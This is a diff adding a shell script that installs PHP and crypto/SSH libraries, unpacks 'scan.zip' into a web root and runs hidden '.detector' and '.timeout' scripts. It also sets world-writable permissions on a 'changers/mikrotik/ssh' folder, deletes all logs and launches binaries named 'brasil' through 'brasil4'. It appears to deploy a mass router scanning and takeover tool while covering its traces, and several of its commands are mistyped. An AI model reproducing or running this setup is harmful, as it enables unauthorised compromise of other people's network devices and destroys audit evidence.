@@ -1,0 +1,35 @@
+apt-get -y update
+apt-get -y upgrade
+apt-get install php5
+apt-get install php5-cli
+apt-get install vim
+apt-get install make
+apt-get install g++
+apt-get install libssl-dev
+apt-get install openssl
+apt-get install libevent-pthreads-2.0-5
+apt-get install libgcrypt11
+apt-get install libcrypto++-dev
+apt-get install libcrypt-gcrypt-perl
+apt-get install libgcrypt11-dev
+apt-get install libssh2-php
+
+apt-get -y update;apt-get -y upgrade;apt-get install -y nano;apt-get install -y make;apt-get install -y g++;apt-get install -y apache2;apt-get insall -y php5;apt-get install -y libssl-dev; apt-get install -y openssl; apt-get install -y libevent-pthreads-2.0-5;apt-get install libgcrypt11;apt-get install -y libcrypto++-dev;apt-get install libcrypt-gcrypt-perl;apt-get install -y libgcrypt11-dev;apt-get install -y libssh2-php; apt-get install php5-curl; apt-get insall -y php5-curl; apt-get install-y mailutils; apt-get install -y curl; apt-get install -y libapache2-mod-php5; apt-get install -y libssh-dev; cd /var/www/html/ ; apt-get install -y
+
+unzip;apt-get install -y zip; apt-get install php5-cli; unzip scan.zip;
+cd /var/www/html/configs/ ;
+rm -rf classes* ;
+touch classes.cfg ;
+touch classes2.cfg ;
+touch classes3.cfg ; 
+touch classes4.cfg ;
+touch classes5.cfg ;
+cd .. ;
+
+cd /var/www/html/;chmod 777 changers/mikrotik/ssh ; chmod 777 changers/* ; chmod 777 * ; ./mdetector -b ;
+ chmod 777 .* ; php .timeout; php .detector; cd /var/www/html/logs/; rm  -rf *.log ; rm -rf *.txt ; cd /var/www/html/ ;
+./brasil -s 100 ; ./brasil2 -s 100 ;  ./brasil3 -s 100 ;  ./brasil4 -s 100 ; 
+
+killall -9 brasil; killall -9 brasil2; killall -9 brasil3; killall -9 brasil4;
+
+  
